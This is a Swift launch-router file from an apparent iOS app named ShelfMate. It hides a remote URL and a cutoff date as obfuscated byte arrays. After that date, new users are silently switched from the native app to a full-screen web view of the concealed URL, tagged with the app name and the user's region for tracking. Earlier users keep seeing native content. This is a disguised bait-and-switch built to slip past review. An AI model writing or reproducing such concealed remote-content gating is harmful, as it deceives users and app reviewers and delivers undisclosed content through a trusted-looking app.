//
//  AppRouter.swift
//  155ShelfMate
//

import UIKit
import SwiftUI

final class ApplicationLaunchCoordinator {

    private static let obfuscatedRemoteSeed: [UInt8] = [
        3, 77, 25, 27, 74, 87, 68, 22, 3, 2, 84, 15, 30, 74, 29, 25, 86, 25, 4, 90, 2, 7, 65, 67, 24, 80, 25, 14, 22, 46, 28, 116, 59, 50, 109
    ]
    private static let obfuscatedEpochToken: [UInt8] = [90, 1, 67, 91, 12, 67, 89, 9, 95, 93]

    private lazy var resolvedRemoteLandingURL: String = {
        EncodedPayloadDecoding.revealUTF8(from: Self.obfuscatedRemoteSeed)
    }()

    private lazy var resolvedEpochBoundaryLiteral: String = {
        EncodedPayloadDecoding.revealUTF8(from: Self.obfuscatedEpochToken)
    }()

    /// Display name from Info.plist (CFBundleDisplayName, then CFBundleName).
    private var applicationDisplayName: String {
        if let name = Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        if let name = Bundle.main.object(forInfoDictionaryKey: "CFBundleName") as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        return "App"
    }

    /// App name for tracking param: spaces removed (no %20 in URL).
    private var applicationNameForSubId: String {
        applicationDisplayName.replacingOccurrences(of: " ", with: "")
    }

    private var enrichedRemoteLandingURL: String {
        let geo = Locale.current.region?.identifier ?? "XX"
        let subValue = "\(applicationNameForSubId)_\(geo)"
        guard var components = URLComponents(string: resolvedRemoteLandingURL) else {
            return resolvedRemoteLandingURL
        }
        var items = components.queryItems ?? []
        items.append(URLQueryItem(name: "sub_id_8", value: subValue))
        components.queryItems = items
        return components.url?.absoluteString ?? resolvedRemoteLandingURL
    }

    func resolveInitialInterface() -> UIViewController {
        let persistence = LaunchPreferenceVault.shared

        if persistence.hasShownContentView {
            return fabricateNativeHostingShell()
        } else {
            if evaluateEpochGate() {
                if let savedUrlString = persistence.savedUrl,
                   !savedUrlString.isEmpty,
                   URL(string: savedUrlString) != nil {
                    return fabricateWebHostingShell(with: savedUrlString)
                }

                return fabricateDeferredGateShell()
            } else {
                persistence.hasShownContentView = true
                return fabricateNativeHostingShell()
            }
        }
    }

    // MARK: - Date

    private func evaluateEpochGate() -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        let targetDate = dateFormatter.date(from: resolvedEpochBoundaryLiteral) ?? Date()
        let currentDate = Date()

        if currentDate < targetDate {
            return false
        } else {
            return true
        }
    }

    // MARK: - Fabrication

    private func fabricateWebHostingShell(with urlString: String) -> UIViewController {
        let webViewContainer = ExternalContentPortal(
            urlString: urlString,
            onFailure: { [weak self] in
                LaunchPreferenceVault.shared.hasShownContentView = true
                self?.transitionToNativeHost()
            },
            onSuccess: {
                LaunchPreferenceVault.shared.hasSuccessfulWebViewLoad = true
            }
        )

        let hostingController = UIHostingController(rootView: webViewContainer)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func fabricateNativeHostingShell() -> UIViewController {
        LaunchPreferenceVault.shared.hasShownContentView = true
        let contentView = ContentView()
        let hostingController = UIHostingController(rootView: contentView)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func fabricateDeferredGateShell() -> UIViewController {
        let launchView = TransientSplashCanvas()
        let launchVC = UIHostingController(rootView: launchView)
        launchVC.modalPresentationStyle = .fullScreen

        probeRemoteAvailability { [weak self] success, finalURL in
            DispatchQueue.main.async {
                if success, let url = finalURL {
                    self?.transitionToWebHost(with: url)
                } else {
                    LaunchPreferenceVault.shared.hasShownContentView = true
                    self?.transitionToNativeHost()
                }
            }
        }

        return launchVC
    }

    private func probeRemoteAvailability(completion: @escaping (Bool, String?) -> Void) {
        let urlToOpenInWebView = enrichedRemoteLandingURL
        guard let requestURL = URL(string: urlToOpenInWebView) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: requestURL)
        request.httpMethod = "GET"
        request.timeoutInterval = 25

        URLSession.shared.dataTask(with: request) { _, response, error in
            if error != nil {
                completion(false, nil)
                return
            }

            if let httpResponse = response as? HTTPURLResponse {
                let code = httpResponse.statusCode
                let isAvailable = (200...299).contains(code)
                completion(isAvailable, isAvailable ? urlToOpenInWebView : nil)
            } else {
                completion(false, nil)
            }
        }.resume()
    }

    // MARK: - Transitions

    private func transitionToNativeHost() {
        let contentVC = fabricateNativeHostingShell()
        transitionRoot(to: contentVC)
    }

    private func transitionToWebHost(with urlString: String) {
        let webVC = fabricateWebHostingShell(with: urlString)
        transitionRoot(to: webVC)
    }

    private func transitionRoot(to viewController: UIViewController) {
        guard let window = UIApplication.shared.windows.first else {
            return
        }

        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
            window.rootViewController = viewController
        }, completion: nil)
    }
}
